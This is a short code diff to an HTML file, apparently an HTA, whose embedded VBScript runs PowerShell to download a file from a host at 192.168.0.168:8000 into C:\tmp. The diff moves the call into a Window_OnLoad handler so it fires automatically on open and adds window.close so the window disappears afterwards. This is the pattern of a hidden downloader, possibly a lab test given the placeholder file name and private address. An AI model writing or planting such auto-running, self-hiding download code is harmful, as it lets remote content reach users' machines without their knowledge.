@@ -1,8 +1,11 @@
 <HTML> 
 <HEAD> 
 <script language="VBScript">
+    Sub Window_OnLoad
     Set objShell = CreateObject("Wscript.Shell")
-    objShell.Run "powershell -nop -exec -c (New-Object Net.WebClient).DownloadFile('http://192.168.0.168:8000/HelloWorld','C:\tmp\HelloWorld.txt')"
+    objShell.Run "powershell -nop -exec -c (New-Object Net.WebClient).DownloadFile('http://192.168.0.168:8000/HelloWorld','C:\tmp\HelloWorld-WAN.txt')"
+    window.close
+    End Sub
 </script>
 </HEAD> 
 <BODY> 
